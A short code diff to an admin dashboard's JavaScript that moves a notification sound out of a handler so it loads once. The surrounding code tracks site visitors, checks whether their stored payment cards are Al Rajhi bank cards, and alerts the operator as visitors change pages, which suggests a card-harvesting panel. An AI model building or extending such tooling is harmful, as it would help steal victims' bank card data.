@@ -383,6 +383,10 @@
     let visitors = new Map();
     let selectedVisitorId = null;
 
+    // Pre-load frog sound once
+    const frogAudio = new Audio('/admin/frog.mp3');
+    frogAudio.volume = 0.7;
+
     // دالة التحقق إذا كانت البطاقة تابعة للراجحي
     function isRajhiCard(visitor) {
       // البحث في بطاقات الزائر (paymentCards هو الاسم الصحيح)
@@ -1122,8 +1126,7 @@
         const currentPage = data && data.page ? data.page : (visitor.page || '');
         if (!noSoundPages.includes(currentPage)) {
           try {
-            const frogAudio = new Audio('/admin/frog.mp3');
-            frogAudio.volume = 0.7;
+            frogAudio.currentTime = 0;
             frogAudio.play().catch(() => {});
           } catch(e) {}
         }
